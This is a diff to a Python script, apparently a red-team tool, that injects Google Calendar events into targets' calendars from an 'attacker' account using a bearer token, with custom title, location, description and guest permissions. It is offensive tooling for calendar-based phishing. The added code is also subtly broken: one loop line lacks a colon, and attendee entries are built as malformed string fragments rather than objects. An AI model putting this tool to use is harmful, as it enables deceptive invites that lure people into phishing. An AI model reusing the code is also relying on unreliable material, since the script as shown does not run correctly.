@@ -1,12 +1,12 @@
 import requests
 import sys, getopt
-from googleapiclient.discovery import build
 
 def main(argv):
     attacker_email = ''
     access_token = ''
     targets = ''
     target_list = []
+    target_json_list = []
     start_DateTime = ''
     finish_DateTime = ''
     event_title = ''
@@ -138,54 +138,50 @@ def main(argv):
 
 
 
-# api endpoint
-    URL = "https://www.googleapis.com/calendars/" + attacker_email + "/events"
+    # api endpoint
+    URL = "https://www.googleapis.com/calendar/v3/calendars/" + attacker_email + "/events"
+
+    # Split target string into a list
     target_list = targets.split(",")
 
-# Debugging
-    print("Access Token: " + access_token)
-    print("Attacker Email: " + attacker_email)
-    print("Start DateTime: " + start_DateTime)
-    print("Finish DateTime: " + finish_DateTime)
-    print("Targets: " + targets)
-    print("Event Title: " + event_title)
-    print("Event Location: " + event_location)
-    print("Event Description: " + event_description)
-    print("Allow Modify: " + allow_modify)
-    print("Allow Invite Others: " + allow_invite_others)
-    print("Show Invitees: " + show_invitees)
-    print("Response Status: " + response_status)
-    print("Time Zone: " + time_zone)
-    for item in target_list:
-        print("Target:" + item)
-    print("API Endpoint: " +URL)
-# End Debugging
-
-# Event Data to be sent to the api
+    # Create a new list of json strings using the target and statas params
     for target in target_list:
-        event = {
-            'summary': event_title,
-            'location': event_location,
-            'description': event_description,
-            'start': {
-                'dateTime': start_DateTime,
-                'timeZone': time_zone,
-            },
-            'end': {
-                'dateTime': finish_DateTime,
-                'timeZone': time_zone
-            },
-            'attendees': [
-                {'email': target,'responseStatus': response_status},
-            ],
-            'guestsCanInviteOthers': allow_invite_others,
-            'guestsCanSeeOtherGuests': show_invitees,
-            'guestsCanModify': allow_modify
-        }
-    event = service.events().insert(calendarId='primary', body=event).execute()
-    print ('Event created: %s' % (event.get('htmlLink')))
+        target_json_list.append('{\'email\': ' + target +
+            ', \'responseStatus\': ' + response_status + '},')
 
+    # Event Data and header to be sent to the api
+    event = {
+        'kind': 'calendar#event',
+        'summary': event_title,
+        'location': event_location,
+        'description': event_description,
+        'start': {
+            'dateTime': start_DateTime,
+            'timeZone': time_zone,
+        },
+        'end': {
+            'dateTime': finish_DateTime,
+            'timeZone': time_zone
+        },
+        'attendees': target_json_list,
+        'guestsCanInviteOthers': allow_invite_others,
+        'guestsCanSeeOtherGuests': show_invitees,
+        'guestsCanModify': allow_modify
+    }
+    header = {
+        'Accept': '*/*',
+        'Content-Type': 'application/json',
+        'Authorization': "Bearer " + access_token
+    }
 
+    # Tell the user what is going on
+    for target in target_list
+        print("[*] Now injecting event into target calendar(s): " + target)
+
+    # Post the requests
+    response = requests.post(URL, json= event, headers= header)
+
+    print("Response: " + str(response) + "\n")
 
 if __name__ == "__main__":
     main(sys.argv[1:])
